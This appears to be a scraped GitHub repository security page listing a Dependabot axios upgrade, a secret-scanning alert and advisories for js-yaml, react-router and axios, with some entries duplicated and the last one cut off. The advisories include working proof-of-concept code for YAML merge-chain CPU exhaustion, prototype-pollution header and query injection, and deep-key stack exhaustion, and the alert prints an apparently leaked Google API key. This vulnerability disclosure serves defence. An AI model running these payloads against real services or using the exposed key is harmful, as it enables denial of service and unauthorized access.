chore(deps): bump axios from 1.15.0 to 1.18.0 in /frontend- #1
#1
Open
dependabot[bot]
wants to merge 1 commit into
main
from
dependabot/npm_and_yarn/frontend/axios-1.18.0
Automated security update
Merging this pull request will resolve Dependabot Alerts on axios including a moderate severity alert
+38
-12
Lines changed: 38 additions & 12 deletions
Conversation0 (0)
Commits1 (1)
Checks0 (0)
Files changed2 (2)
Open
chore(deps): bump axios from 1.15.0 to 1.18.0 in /frontend#1
dependabot[bot]
wants to merge 1 commit into
main
from
dependabot/npm_and_yarn/frontend/axios-1.18.0
Conversation
@dependabot
dependabot Bot
commented on behalf of
github
yesterday
Bumps axios from 1.15.0 to 1.18.0.

Release notes
Changelog
Commits

Dependabot compatibility score

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting @dependabot rebase.

Dependabot commands and options
@dependabot
chore(deps): bump axios from 1.15.0 to 1.18.0 in /frontend 
0000892
@dependabot dependabot Bot added dependencies javascript labels yesterday
Merge info
No conflicts with base branch
Merging can be performed automatically.

Google API Key #1
Open
GitHub detected a secret • Jun 5
Publicly leaked secret
Secret	
AIzaSyDKBLJvyBQANNvuRLrHcy2dka8lxfoUG68
Validity	
Unknown
Remediation steps
Follow the steps below before you close this alert.
1 (1)Rotate the secret if it's in use to prevent breaking workflows.
2 (2)Revoke this Google API Key through Google to prevent unauthorized access. Learn more about Google tokens.
3 (3)Check security logs for potential breaches.
4 (4)Close the alert as revoked.
Detected in 3 locations
frontend/env.production.bk
VITE_FIREBASE_API_KEY=AIzaSyDKBLJvyBQANNvuRLrHcy2dka8lxfoUG68
VITE_FIREBASE_AUTH_DOMAIN=pretso-platform.firebaseapp.com
VITE_FIREBASE_PROJECT_ID=pretso-platform
VITE_API_BASE_URL=https://pretso-backend-xxxx-uc.a.run.app
Commit author avatar
Refactor: Pydantic V2, FastAPI lifespan, and ETL manual review flows1c6bb16
on Jun 5
frontend/.env.production
frontend/.env.local

js-yaml: YAML merge-key chains can force quadratic CPU consumption #11
Open
On js-yaml (npm) functions/package-lock.json • 4 hours ago
Loading
Creating a security update for js-yaml
Dependabot is creating a security update to fix 1 Dependabot alert on js-yaml in functions/package-lock.json.

Or, manually upgrade js-yaml to version 3.15.0 or later. For example:

"dependencies": {
  "js-yaml": ">=3.15.0"
}
"devDependencies": {
  "js-yaml": ">=3.15.0"
}
Package
Affected versions
Patched version
js-yaml
(npm)
>= 3.0.0, < 3.15.0
3.15.0
Impact
js-yaml can spend quadratic CPU time parsing a document whose size grows only linearly. The issue is triggered by a chain of mappings where each mapping merges the previous one:

a0: &a0 { k0: 0 }
a1: &a1 { <<: *a0, k1: 1 }
a2: &a2 { <<: *a1, k2: 2 }
a3: &a3 { <<: *a2, k3: 3 }
...
b: *aN
For each new mapping, the loader has to enumerate the keys inherited from the previous mapping. With N chained mappings, this results in roughly 1 + 2 + ... + N merged-key visits, i.e., O(N^2) work for O(N) input size.

PoC
From N = 4000 delay become > 1s (doc size < 100K)

import { performance } from 'node:perf_hooks'
import { Buffer } from 'node:buffer'
import { load, YAML11_SCHEMA } from 'js-yaml'

const n = Number(process.argv[2] || 4000)

function makeMergeChain (count) {
  const lines = ['a0: &a0 { k0: 0 }']

  for (let i = 1; i < count; i++) {
    lines.push(`a${i}: &a${i} { <<: *a${i - 1}, k${i}: ${i} }`)
  }

  lines.push(`b: *a${count - 1}`)
  return `${lines.join('\n')}\n`
}

const source = makeMergeChain(n)

console.log(source.split('\n').slice(0, 8).join('\n'))
console.log('...')
console.log(source.split('\n').slice(-4).join('\n'))
console.log()
console.log(`N: ${n}`)
console.log(`YAML size: ${Buffer.byteLength(source)} bytes`)

const started = performance.now()
const result = load(source, { schema: YAML11_SCHEMA })
const elapsed = performance.now() - started

console.log(`parse time: ${elapsed.toFixed(1)} ms`)
console.log(`top-level keys: ${Object.keys(result).length}`)
console.log(`b keys: ${Object.keys(result.b).length}`)
Patches
Fix released. The most robust protection is to limit the total number of merged keys per parse call. This should close all past and future edge cases with merge. The default 10K-key limit should be okay in most cases.

js-yaml: YAML merge-key chains can force quadratic CPU consumption #10
Open
On js-yaml (npm) pretsocodebase/package-lock.json • 4 hours ago
Dependabot cannot update js-yaml to a non-vulnerable version
The latest possible version that can be installed is 3.14.2 because of the following conflicting dependency:

A patched version exists for js-yaml, but the available update path would downgrade firebase-functions-test from 3.4.1 to 2.1.0 because:
The following packages currently require js-yaml through these dependency edges:
  - firebase-functions-test: requires js-yaml@^3.13.1 (via @istanbuljs/load-nyc-config@1.1.0)

These edges help explain why npm selected a downgrade path. To resolve this, either:
  1. Update firebase-functions-test to versions that support the patched js-yaml, or
  2. Add an override/resolution to pin js-yaml to a non-vulnerable version compatible with your dependencies
The earliest fixed version is 3.15.0.

Package
Affected versions
Patched version
js-yaml
(npm)
>= 3.0.0, < 3.15.0
3.15.0
Impact
js-yaml can spend quadratic CPU time parsing a document whose size grows only linearly. The issue is triggered by a chain of mappings where each mapping merges the previous one:

a0: &a0 { k0: 0 }
a1: &a1 { <<: *a0, k1: 1 }
a2: &a2 { <<: *a1, k2: 2 }
a3: &a3 { <<: *a2, k3: 3 }
...
b: *aN
For each new mapping, the loader has to enumerate the keys inherited from the previous mapping. With N chained mappings, this results in roughly 1 + 2 + ... + N merged-key visits, i.e., O(N^2) work for O(N) input size.

PoC
From N = 4000 delay become > 1s (doc size < 100K)

import { performance } from 'node:perf_hooks'
import { Buffer } from 'node:buffer'
import { load, YAML11_SCHEMA } from 'js-yaml'

const n = Number(process.argv[2] || 4000)

function makeMergeChain (count) {
  const lines = ['a0: &a0 { k0: 0 }']

  for (let i = 1; i < count; i++) {
    lines.push(`a${i}: &a${i} { <<: *a${i - 1}, k${i}: ${i} }`)
  }

  lines.push(`b: *a${count - 1}`)
  return `${lines.join('\n')}\n`
}

const source = makeMergeChain(n)

console.log(source.split('\n').slice(0, 8).join('\n'))
console.log('...')
console.log(source.split('\n').slice(-4).join('\n'))
console.log()
console.log(`N: ${n}`)
console.log(`YAML size: ${Buffer.byteLength(source)} bytes`)

const started = performance.now()
const result = load(source, { schema: YAML11_SCHEMA })
const elapsed = performance.now() - started

console.log(`parse time: ${elapsed.toFixed(1)} ms`)
console.log(`top-level keys: ${Object.keys(result).length}`)
console.log(`b keys: ${Object.keys(result.b).length}`)
Patches
Fix released. The most robust protection is to limit the total number of merged keys per parse call. This should close all past and future edge cases with merge. The default 10K-key limit should be okay in most cases.

React Router: Open redirect leading to XSS #5
Open
On react-router-dom (npm) frontend/package-lock.json • yesterday
Package
Affected versions
Patched version
react-router-dom
(npm)
>= 6.30.2, <= 6.30.4
None
Applications with open redirects could permit attacker crafted links to result in redirects to unexpected external location or XSS vectors.

Axios: Prototype pollution gadgets can alter axios request construction #9
Open
On axios (npm) functions/package-lock.json • 14 hours ago
Loading
Creating a security update for axios
Dependabot is creating a security update to fix 2 Dependabot alerts on axios in functions/package-lock.json.

Or, manually upgrade axios to version 1.18.0 or later. For example:

"dependencies": {
  "axios": ">=1.18.0"
}
"devDependencies": {
  "axios": ">=1.18.0"
}
Transitive dependency axios 1.15.0 is introduced via
genkit-cli 1.31.0  axios 1.15.0
Package
Affected versions
Patched version
axios
(npm)
>= 1.0.0, < 1.18.0
1.18.0
Summary
axios is vulnerable to read-side prototype-pollution gadgets when Object.prototype has already been polluted by another vulnerability or dependency. The most broadly reachable issue is in the bodyless method aliases: axios.get(), axios.delete(), axios.head(), and axios.options() read inherited data before config normalization, causing attacker-controlled body data to be sent on requests that did not explicitly set a body.

Additional low-level paths affect consumers that call exported adapters/helpers directly with plain config objects. In those cases, inherited proxy or paramsSerializer values can influence request routing or URL serialization. These low-level paths are not reproduced through normal axios.get() usage on 1.15.2+.

Impact
An attacker who can first pollute Object.prototype can cause axios to send attacker-controlled request bodies on bodyless method aliases. This can corrupt request semantics where the receiving service processes bodies on GET, DELETE, HEAD, or OPTIONS.

For direct low-level Node HTTP adapter usage, inherited proxy can route requests through an attacker-controlled proxy. Depending on axios version, target scheme, and proxy behavior, this can expose request URLs, headers, and bodies or allow traffic modification.

For direct resolveConfig or browser-adapter helper usage, inherited paramsSerializer can be invoked with request params, allowing attacker-controlled URL serialization. This was not reproduced through normal high-level axios calls on 1.15.2+.

Affected Functionality
Affected normal API:

axios.get(url[, config])
axios.delete(url[, config])
axios.head(url[, config])
axios.options(url[, config])
Affected low-level usage:

Direct calls to axios/lib/adapters/http.js or axios/unsafe/adapters/http.js with plain configs and no own proxy.
Direct calls to axios/unsafe/helpers/resolveConfig.js or direct browser adapter/helper paths with plain configs and no own paramsSerializer.
Unaffected or corrected scope:

Normal axios.get() calls on 1.15.2+ did not reproduce the proxy or paramsSerializer gadgets because mergeConfig() returns a null-prototype config and uses own-property reads.
Technical Details
lib/core/Axios.js constructs aliases for bodyless methods and copies data with (config || {}).data before config normalization. If Object.prototype.data is polluted, this inherited value becomes an own data property in the merged request config and is sent by the adapter.

lib/core/mergeConfig.js in 1.15.2+ returns a null-prototype config and uses hasOwnProp guards, which prevents normal high-level requests from inheriting polluted proxy and paramsSerializer values after merge. This is why those two reporter claims do not reproduce through normal axios.get() on 1.15.2 or 1.16.1.

The low-level adapter/helper paths can still receive plain configs directly. In that usage, direct reads of config.proxy in the Node HTTP adapter and config.paramsSerializer in affected resolveConfig() versions can consume inherited polluted values.

Proof of Concept of Attack
import http from 'http';
import axios from 'axios';

const server = http.createServer((req, res) => {
  let body = '';

  req.on('data', chunk => {
    body += chunk;
  });

  req.on('end', () => {
    res.writeHead(200, {'content-type': 'application/json'});
    res.end(JSON.stringify({body, headers: req.headers}));
  });
});

await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));

Object.prototype.data = 'INJECTED';

try {
  const res = await axios.get(`http://127.0.0.1:${server.address().port}/data`);

  console.log(res.data.body); // "INJECTED"
  console.log(res.data.headers['content-length']); // "8"
} finally {
  delete Object.prototype.data;
  await new Promise(resolve => server.close(resolve));
}
Expected result: a request body is sent even though the caller did not explicitly set config.data.

Workarounds
Avoid processing untrusted input with libraries or code paths that can pollute Object.prototype. As a defense-in-depth mitigation before an axios fix is available, explicitly pass data: undefined on bodyless method aliases when running in a process where prototype pollution is a concern.

Axios: Prototype pollution gadgets can alter axios request construction #8
Open
On axios (npm) frontend/package-lock.json • 14 hours ago
Loading
Creating a security update for axios
Dependabot is creating a security update to fix 4 Dependabot alerts on axios in frontend/package-lock.json.

Or, manually upgrade axios to version 1.18.0 or later. For example:

"dependencies": {
  "axios": ">=1.18.0"
}
"devDependencies": {
  "axios": ">=1.18.0"
}
Package
Affected versions
Patched version
axios
(npm)
>= 1.0.0, < 1.18.0
1.18.0
Summary
axios is vulnerable to read-side prototype-pollution gadgets when Object.prototype has already been polluted by another vulnerability or dependency. The most broadly reachable issue is in the bodyless method aliases: axios.get(), axios.delete(), axios.head(), and axios.options() read inherited data before config normalization, causing attacker-controlled body data to be sent on requests that did not explicitly set a body.

Additional low-level paths affect consumers that call exported adapters/helpers directly with plain config objects. In those cases, inherited proxy or paramsSerializer values can influence request routing or URL serialization. These low-level paths are not reproduced through normal axios.get() usage on 1.15.2+.

Impact
An attacker who can first pollute Object.prototype can cause axios to send attacker-controlled request bodies on bodyless method aliases. This can corrupt request semantics where the receiving service processes bodies on GET, DELETE, HEAD, or OPTIONS.

For direct low-level Node HTTP adapter usage, inherited proxy can route requests through an attacker-controlled proxy. Depending on axios version, target scheme, and proxy behavior, this can expose request URLs, headers, and bodies or allow traffic modification.

For direct resolveConfig or browser-adapter helper usage, inherited paramsSerializer can be invoked with request params, allowing attacker-controlled URL serialization. This was not reproduced through normal high-level axios calls on 1.15.2+.

Affected Functionality
Affected normal API:

axios.get(url[, config])
axios.delete(url[, config])
axios.head(url[, config])
axios.options(url[, config])
Affected low-level usage:

Direct calls to axios/lib/adapters/http.js or axios/unsafe/adapters/http.js with plain configs and no own proxy.
Direct calls to axios/unsafe/helpers/resolveConfig.js or direct browser adapter/helper paths with plain configs and no own paramsSerializer.
Unaffected or corrected scope:

Normal axios.get() calls on 1.15.2+ did not reproduce the proxy or paramsSerializer gadgets because mergeConfig() returns a null-prototype config and uses own-property reads.
Technical Details
lib/core/Axios.js constructs aliases for bodyless methods and copies data with (config || {}).data before config normalization. If Object.prototype.data is polluted, this inherited value becomes an own data property in the merged request config and is sent by the adapter.

lib/core/mergeConfig.js in 1.15.2+ returns a null-prototype config and uses hasOwnProp guards, which prevents normal high-level requests from inheriting polluted proxy and paramsSerializer values after merge. This is why those two reporter claims do not reproduce through normal axios.get() on 1.15.2 or 1.16.1.

The low-level adapter/helper paths can still receive plain configs directly. In that usage, direct reads of config.proxy in the Node HTTP adapter and config.paramsSerializer in affected resolveConfig() versions can consume inherited polluted values.

Proof of Concept of Attack
import http from 'http';
import axios from 'axios';

const server = http.createServer((req, res) => {
  let body = '';

  req.on('data', chunk => {
    body += chunk;
  });

  req.on('end', () => {
    res.writeHead(200, {'content-type': 'application/json'});
    res.end(JSON.stringify({body, headers: req.headers}));
  });
});

await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));

Object.prototype.data = 'INJECTED';

try {
  const res = await axios.get(`http://127.0.0.1:${server.address().port}/data`);

  console.log(res.data.body); // "INJECTED"
  console.log(res.data.headers['content-length']); // "8"
} finally {
  delete Object.prototype.data;
  await new Promise(resolve => server.close(resolve));
}
Expected result: a request body is sent even though the caller did not explicitly set config.data.

Workarounds
Avoid processing untrusted input with libraries or code paths that can pollute Object.prototype. As a defense-in-depth mitigation before an axios fix is available, explicitly pass data: undefined on bodyless method aliases when running in a process where prototype pollution is a concern.

Axios: Nested axios option objects can consume polluted prototype values #7
Open
On axios (npm) functions/package-lock.json • 14 hours ago
Loading
Creating a security update for axios
Dependabot is creating a security update to fix 2 Dependabot alerts on axios in functions/package-lock.json.

Or, manually upgrade axios to version 1.18.0 or later. For example:

"dependencies": {
  "axios": ">=1.18.0"
}
"devDependencies": {
  "axios": ">=1.18.0"
}
Transitive dependency axios 1.15.0 is introduced via
genkit-cli 1.31.0  axios 1.15.0
Package
Affected versions
Patched version
axios
(npm)
>= 1.0.0, < 1.18.0
1.18.0
Summary
Axios can consume inherited properties from nested request option objects when the JavaScript process already has a polluted Object.prototype.

The top-level merged config is protected with a null prototype, but nested plain objects such as auth and paramsSerializer are cloned into ordinary objects. If application code passes placeholders such as auth: {} or paramsSerializer: {}, inherited username, password, encode, or serialize properties can influence outbound requests.

Impact
This is reachable only when another component has already polluted Object.prototype and the application passes an affected nested axios option object.

Confirmed impacts include silent injection of an Authorization: Basic ... header from inherited username and password values, and query-string tampering when inherited paramsSerializer fields are function-valued.

The auth case requires only string-valued pollution. Full query-string replacement through paramsSerializer.serialize requires a function-valued pollution primitive; string-only pollution may still cause request failures or encoding changes through encode.

This does not mean every axios request is affected. Requests that do not pass auth, do not pass paramsSerializer, or provide explicit own properties for the relevant nested fields are not affected by this specific gadget.

Affected Functionality
Affected runtime functionality:

Node HTTP adapter Basic auth handling in lib/adapters/http.js.
Browser/fetch/XHR Basic auth handling through lib/helpers/resolveConfig.js.
Query serialization through lib/helpers/buildURL.js.
axios.getUri() when called with an affected paramsSerializer object.
Affected config shapes:

auth: {} or an auth object missing own username and/or password.
paramsSerializer: {} or a paramsSerializer object missing own encode and/or serialize.
Unaffected by this specific issue:

Requests with no auth property.
Requests with no paramsSerializer property.
Top-level polluted auth or paramsSerializer values in current hardened versions.
Technical Details
lib/core/mergeConfig.js creates the top-level merged config with Object.create(null), but nested object cloning still uses ordinary {} containers:

} else if (utils.isPlainObject(source)) {
  return utils.merge({}, source);
}
Downstream code then reads nested fields without own-property checks.

In lib/helpers/resolveConfig.js:

btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))
In lib/adapters/http.js:

const username = configAuth.username || '';
const password = configAuth.password || '';
auth = username + ':' + password;
In lib/helpers/buildURL.js:

const _encode = (options && options.encode) || encode;
const serializeFn = _options && _options.serialize;
Proof of Concept of Attack
import http from 'node:http';
import axios from './index.js';

const user = 'attacker';
const pass = 'exfil';

Object.defineProperty(Object.prototype, 'username', {
  value: user,
  configurable: true
});

Object.defineProperty(Object.prototype, 'password', {
  value: pass,
  configurable: true
});

Object.defineProperty(Object.prototype, 'serialize', {
  value: () => 'polluted=1',
  configurable: true
});

const server = http.createServer((req, res) => {
  res.writeHead(200, { 'content-type': 'application/json' });
  res.end(JSON.stringify({
    authorization: req.headers.authorization || null,
    url: req.url
  }));
});

await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));

try {
  const port = server.address().port;
  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {
    auth: {},
    paramsSerializer: {},
    params: { unused: 'ignored' }
  });

  console.log(response.data);
} finally {
  await new Promise((resolve) => server.close(resolve));
  delete Object.prototype.username;
  delete Object.prototype.password;
  delete Object.prototype.serialize;
}
Observed result:

{
  "authorization": "Basic YXR0YWNrZXI6ZXhmaWw=",
  "url": "/demo?polluted=1"
}
Workarounds
If upgrading is not yet possible, avoid passing placeholder nested option objects.

Remove auth entirely when Basic auth is not intended. For paramsSerializer objects, provide explicit own encode and serialize properties or remove paramsSerializer when custom serialization is not required.

These workarounds only address this axios gadget. They do not remediate the separate prototype-pollution primitive that must already exist in the application process.

Axios: Nested axios option objects can consume polluted prototype values #6
Open
On axios (npm) frontend/package-lock.json • 14 hours ago
Loading
Creating a security update for axios
Dependabot is creating a security update to fix 4 Dependabot alerts on axios in frontend/package-lock.json.

Or, manually upgrade axios to version 1.18.0 or later. For example:

"dependencies": {
  "axios": ">=1.18.0"
}
"devDependencies": {
  "axios": ">=1.18.0"
}
Package
Affected versions
Patched version
axios
(npm)
>= 1.0.0, < 1.18.0
1.18.0
Summary
Axios can consume inherited properties from nested request option objects when the JavaScript process already has a polluted Object.prototype.

The top-level merged config is protected with a null prototype, but nested plain objects such as auth and paramsSerializer are cloned into ordinary objects. If application code passes placeholders such as auth: {} or paramsSerializer: {}, inherited username, password, encode, or serialize properties can influence outbound requests.

Impact
This is reachable only when another component has already polluted Object.prototype and the application passes an affected nested axios option object.

Confirmed impacts include silent injection of an Authorization: Basic ... header from inherited username and password values, and query-string tampering when inherited paramsSerializer fields are function-valued.

The auth case requires only string-valued pollution. Full query-string replacement through paramsSerializer.serialize requires a function-valued pollution primitive; string-only pollution may still cause request failures or encoding changes through encode.

This does not mean every axios request is affected. Requests that do not pass auth, do not pass paramsSerializer, or provide explicit own properties for the relevant nested fields are not affected by this specific gadget.

Affected Functionality
Affected runtime functionality:

Node HTTP adapter Basic auth handling in lib/adapters/http.js.
Browser/fetch/XHR Basic auth handling through lib/helpers/resolveConfig.js.
Query serialization through lib/helpers/buildURL.js.
axios.getUri() when called with an affected paramsSerializer object.
Affected config shapes:

auth: {} or an auth object missing own username and/or password.
paramsSerializer: {} or a paramsSerializer object missing own encode and/or serialize.
Unaffected by this specific issue:

Requests with no auth property.
Requests with no paramsSerializer property.
Top-level polluted auth or paramsSerializer values in current hardened versions.
Technical Details
lib/core/mergeConfig.js creates the top-level merged config with Object.create(null), but nested object cloning still uses ordinary {} containers:

} else if (utils.isPlainObject(source)) {
  return utils.merge({}, source);
}
Downstream code then reads nested fields without own-property checks.

In lib/helpers/resolveConfig.js:

btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))
In lib/adapters/http.js:

const username = configAuth.username || '';
const password = configAuth.password || '';
auth = username + ':' + password;
In lib/helpers/buildURL.js:

const _encode = (options && options.encode) || encode;
const serializeFn = _options && _options.serialize;
Proof of Concept of Attack
import http from 'node:http';
import axios from './index.js';

const user = 'attacker';
const pass = 'exfil';

Object.defineProperty(Object.prototype, 'username', {
  value: user,
  configurable: true
});

Object.defineProperty(Object.prototype, 'password', {
  value: pass,
  configurable: true
});

Object.defineProperty(Object.prototype, 'serialize', {
  value: () => 'polluted=1',
  configurable: true
});

const server = http.createServer((req, res) => {
  res.writeHead(200, { 'content-type': 'application/json' });
  res.end(JSON.stringify({
    authorization: req.headers.authorization || null,
    url: req.url
  }));
});

await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));

try {
  const port = server.address().port;
  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {
    auth: {},
    paramsSerializer: {},
    params: { unused: 'ignored' }
  });

  console.log(response.data);
} finally {
  await new Promise((resolve) => server.close(resolve));
  delete Object.prototype.username;
  delete Object.prototype.password;
  delete Object.prototype.serialize;
}
Observed result:

{
  "authorization": "Basic YXR0YWNrZXI6ZXhmaWw=",
  "url": "/demo?polluted=1"
}
Workarounds
If upgrading is not yet possible, avoid passing placeholder nested option objects.

Remove auth entirely when Basic auth is not intended. For paramsSerializer objects, provide explicit own encode and serialize properties or remove paramsSerializer when custom serialization is not required.

These workarounds only address this axios gadget. They do not remediate the separate prototype-pollution primitive that must already exist in the application process.

Axios: Excessive recursion in formDataToJSON can cause denial of service #3
Open
On axios (npm) frontend/package-lock.json • yesterday
Loading
Creating a security update for axios
Dependabot is creating a security update to fix 4 Dependabot alerts on axios in frontend/package-lock.json.

Or, manually upgrade axios to version 1.18.0 or later. For example:

"dependencies": {
  "axios": ">=1.18.0"
}
"devDependencies": {
  "axios": ">=1.18.0"
}
Package
Affected versions
Patched version
axios
(npm)
>= 1.0.0, < 1.18.0
1.18.0
Summary
Axios versions 0.28.0 and later contain uncontrolled recursion in formDataToJSON, the helper behind the public axios.formToJSON() / named formToJSON API and the default request transform used when FormData is sent with an application/json content type.

Applications are affected when they pass attacker-controlled FormData field names into this functionality. A field name with thousands of nested bracket segments can exhaust the JavaScript call stack and throw RangeError: Maximum call stack size exceeded, causing request failure and, in applications that do not handle the exception or rejected promise, possible process termination.

Impact
The impact is denial of service against applications that process untrusted FormData field names through axios' FormData-to-JSON conversion.

The vulnerable path is not reached by merely installing axios, by normal multipart FormData pass-through, or by ordinary axios requests that do not request JSON serialisation of FormData. In the default axios request, the error is produced before network I/O and returned as a rejected Promise. Direct use of formToJSON() throws synchronously.

Server-side applications are the primary risk when remote users can submit arbitrary form field names, and the application converts those fields with formToJSON() or sends them through axios as JSON.

Affected Functionality
Affected APIs and paths:

axios.formToJSON(formData)
import { formToJSON } from "axios"
lib/helpers/formDataToJSON.js
axios default transformRequest when data is FormData and Content-Type contains application/json
Unaffected or lower-risk paths:

Normal multipart FormData requests without JSON Content-Type
toFormData() object-to-FormData serialisation, which already has a maxDepth guard
Axios versions before 0.28.0, where this helper and public API were not present
Technical Details
lib/helpers/formDataToJSON.js parses a form field name into path segments with parsePropPath(). For a key such as a[x][x][x], each bracketed segment becomes another path element.

formDataToJSON() then calls the nested buildPath(path, value, target, index) function. buildPath() recursively calls itself once for each path segment and does not enforce a maximum depth:

const result = buildPath(path, value, target[name], index);

A key containing thousands of bracket segments, therefore, creates thousands of recursive calls. At sufficient depth, V8 throws RangeError: Maximum call stack size exceeded.

Axios already applies a depth guard to the inverse serializer in lib/helpers/toFormData.js, where maxDepth defaults to 100 and exceeding it throws AxiosError with code ERR_FORM_DATA_DEPTH_EXCEEDED. formDataToJSON() does not currently have equivalent protection.

Proof of Concept of Attack
import { formToJSON } from "axios";

const fd = new FormData();
fd.append("a" + "[x]".repeat(15000), "value");

try {
  formToJSON(fd);
  console.log("not vulnerable");
} catch (err) {
  console.log(`${err.constructor.name}: ${err.message}`);
}
Expected vulnerable result:

RangeError: Maximum call stack size exceeded

The axios request transform path can also be reached before network I/O:

import axios from "axios";

const fd = new FormData();
fd.append("a" + "[x]".repeat(15000), "value");

await axios
  .post("http://127.0.0.1:1/", fd, {
    headers: { "Content-Type": "application/json" }
  })
  .catch((err) => console.log(`${err.constructor.name}: ${err.message}`));
Expected vulnerable result:

RangeError: Maximum call stack size exceeded

Workarounds
Applications can avoid the vulnerable path by not converting attacker-controlled FormData to JSON with axios.

If conversion is required before a fixed axios release is available, validate FormData field names before calling formToJSON() or before sending FormData with Content-Type: application/json. Reject keys whose parsed nesting depth exceeds the application's expected schema.

For axios requests carrying untrusted FormData, avoid setting Content-Type: application/json; leaving the data as multipart FormData bypasses formDataToJSON().

Catching the resulting error can prevent process termination, but it does not remove the uncontrolled-recursion behaviour and should not be treated as the primary mitigation.

Axios: Excessive recursion in formDataToJSON can cause denial of service #3
Open
On axios (npm) frontend/package-lock.json • yesterday
Loading
Creating a security update for axios
Dependabot is creating a security update to fix 4 Dependabot alerts on axios in frontend/package-lock.json.

Or, manually upgrade axios to version 1.18.0 or later. For example:

"dependencies": {
  "axios": ">=1.18.0"
}
"devDependencies": {
  "axios": ">=1.18.0"
}
Package
Affected versions
Patched version
axios
(npm)
>= 1.0.0, < 1.18.0
1.18.0
Summary
Axios versions 0.28.0 and later contain uncontrolled recursion in formDataToJSON, the helper behind the public axios.formToJSON() / named formToJSON API and the default request transform used when FormData is sent with an application/json content type.

Applications are affected when they pass attacker-controlled FormData field names into this functionality. A field name with thousands of nested bracket segments can exhaust the JavaScript call stack and throw RangeError: Maximum call stack size exceeded, causing request failure and, in applications that do not handle the exception or rejected promise, possible process termination.

Impact
The impact is denial of service against applications that process untrusted FormData field names through axios' FormData-to-JSON conversion.

The vulnerable path is not reached by merely installing axios, by normal multipart FormData pass-through, or by ordinary axios requests that do not request JSON serialisation of FormData. In the default axios request, the error is produced before network I/O and returned as a rejected Promise. Direct use of formToJSON() throws synchronously.

Server-side applications are the primary risk when remote users can submit arbitrary form field names, and the application converts those fields with formToJSON() or sends them through axios as JSON.

Affected Functionality
Affected APIs and paths:

axios.formToJSON(formData)
import { formToJSON } from "axios"
lib/helpers/formDataToJSON.js
axios default transformRequest when data is FormData and Content-Type contains application/json
Unaffected or lower-risk paths:

Normal multipart FormData requests without JSON Content-Type
toFormData() object-to-FormData serialisation, which already has a maxDepth guard
Axios versions before 0.28.0, where this helper and public API were not present
Technical Details
lib/helpers/formDataToJSON.js parses a form field name into path segments with parsePropPath(). For a key such as a[x][x][x], each bracketed segment becomes another path element.

formDataToJSON() then calls the nested buildPath(path, value, target, index) function. buildPath() recursively calls itself once for each path segment and does not enforce a maximum depth:

const result = buildPath(path, value, target[name], index);

A key containing thousands of bracket segments, therefore, creates thousands of recursive calls. At sufficient depth, V8 throws RangeError: Maximum call stack size exceeded.

Axios already applies a depth guard to the inverse serializer in lib/helpers/toFormData.js, where maxDepth defaults to 100 and exceeding it throws AxiosError with code ERR_FORM_DATA_DEPTH_EXCEEDED. formDataToJSON() does not currently have equivalent protection.

Proof of Concept of Attack
import { formToJSON } from "axios";

const fd = new FormData();
fd.append("a" + "[x]".repeat(15000), "value");

try {
  formToJSON(fd);
  console.log("not vulnerable");
} catch (err) {
  console.log(`${err.constructor.name}: ${err.message}`);
}
Expected vulnerable result:

RangeError: Maximum call stack size exceeded

The axios request transform path can also be reached before network I/O:

import axios from "axios";

const fd = new FormData();
fd.append("a" + "[x]".repeat(15000), "value");

await axios
  .post("http://127.0.0.1:1/", fd, {
    headers: { "Content-Type": "application/json" }
  })
  .catch((err) => console.log(`${err.constructor.name}: ${err.message}`));
Expected vulnerable result:

RangeError: Maximum call stack size exceeded

Workarounds
Applications can avoid the vulnerable path by not converting attacker-controlled FormData to JSON with axios.

If conversion is required before a fixed axios release is available, validate FormData field names before calling formToJSON() or before sending FormData with Content-Type: application/json. Reject keys whose parsed nesting depth exceeds the application's expected schema.

For axios requests carrying untrusted FormData, avoid setting Content-Type: application/json; leaving the data as multipart FormData bypasses formDataToJSON().

Catching the resulting error can prevent process termination, but it does not remove the uncontrolled-recursion behaviour and should not be treated as the primary mitigation.

Axios: Deep formToJSON Key Recursion Can Cause Denial of Service #1
Open
On axios (npm) frontend/package-lock.json • yesterday
Loading
Creating a security update for axios
Dependabot is creating a security update to fix 4 Dependabot alerts on axios in frontend/package-lock.json.

Or, manually upgrade axios to version 1.18.0 or later. For example:

"dependencies": {
  "axios": ">=1.18.0"
}
"devDependencies": {
  "axios": ">=1.18.0"
}
Package
Affected versions
Patched version
axios
(npm)
>= 1.0.0, < 1.18.0
1.18.0
Summary
Axios versions starting with 0.28.0 contain uncontrolled recursion in formDataToJSON, which is exposed as axios.formToJSON() and used internally when axios serialises FormData with Content-Type: application/json.

If an application passes attacker-controlled FormData field names to this functionality, a field name with thousands of nested bracket segments can exhaust the JavaScript call stack and cause denial of service for that request or, in applications without appropriate error handling, process termination.

Impact
Applications are affected only when untrusted users can control FormData key names that are converted through axios.

Affected paths include direct use of axios.formToJSON() on untrusted FormData and axios requests in which attacker-controlled FormData is sent with Content-Type: application/json.

The observed failure is RangeError: Maximum call stack size exceeded. In local testing, this error is catchable, so process-wide crash depends on the consuming application's error handling and runtime behaviour.

Affected Functionality
Affected functionality:

axios.formToJSON(formData)
Named ESM export formToJSON
Default transformRequest behaviour for FormData when Content-Type contains application/json
Unaffected functionality:

Normal multipart FormData submission without JSON serialisation
toFormData, which already enforces a maxDepth guard
Axios versions <=0.27.2, where formDataToJSON was not present
Technical Details
The vulnerable code is in lib/helpers/formDataToJSON.js.

parsePropPath() splits a field name such as a[x][x][x] into path segments. buildPath() then recursively processes one segment per call without enforcing a maximum depth:

const result = buildPath(path, value, target[name], index);
A key with thousands of bracket-delimited segments causes thousands of recursive calls and can exceed the JavaScript engine's call stack limit.

Relevant source locations:

lib/helpers/formDataToJSON.js contains the unbounded recursive buildPath().
lib/axios.js exposes the helper as axios.formToJSON.
index.js exposes formToJSON as a named export.
index.d.ts and index.d.cts declare the public API.
lib/defaults/index.js calls formDataToJSON(data) when JSON-serializing FormData.
The inverse helper, toFormData, already enforces maxDepth and throws AxiosError with ERR_FORM_DATA_DEPTH_EXCEEDED, but formDataToJSON does not have an equivalent guard.

Proof of Concept of Attack
import axios from 'axios';

const fd = new FormData();
